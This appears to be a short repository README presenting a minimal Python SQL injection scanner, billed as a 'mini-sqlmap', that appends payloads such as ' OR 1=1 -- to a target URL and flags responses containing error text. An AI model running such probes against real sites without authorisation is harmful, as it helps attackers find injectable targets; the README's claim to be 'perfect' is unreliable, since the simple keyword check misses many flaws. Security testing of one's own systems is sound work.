### GLISH_SCAN_SQL
Mini-sqlmap, very simplified and perfect


```python
import requests

# List of common SQL payloads
payloads = ["'", "\"", "' OR 1=1 --", "\" OR 1=1 --"]

# Main scan function
def scanner_sql_injection(url):
    print(f"[+] Testing URL: {url}")
    # Create/Overwrite the report file
    with open("scan_report.txt", "w") as report:
        report.write(f"SQL Injection Scan Report for URL: {url}\n")
        report.write("-" * 60 + "\n")
        
        for payload in payloads:
            test_url = url + payload
            try:
                response = requests.get(test_url, timeout=5)
                if ("error" in response.text.lower() or "sql" in response.text.lower()):
                    message = f"[!] Potential vulnerability detected with payload: {payload}\n"
                    print(message.strip())
                    report.write(message)
                else:
                    message = f"[-] No vulnerability detected with payload: {payload}\n"
                    report.write(message)
            except Exception as e:
                error = f"[!] Request error with payload {payload}: {e}\n"
                print(error.strip())
                report.write(error)

        report.write("-" * 60 + "\n")
        report.write("End of scan.\n")

```
### Example of usage

```python
if __name__ == "__main__":
    target_url = input("Enter target URL (e.g., http://localhost/vulnerable.php?id=1) : ")
    scanner_sql_injection(target_url)
    print("[+] Report saved in 'scan_report.txt'")
``` 
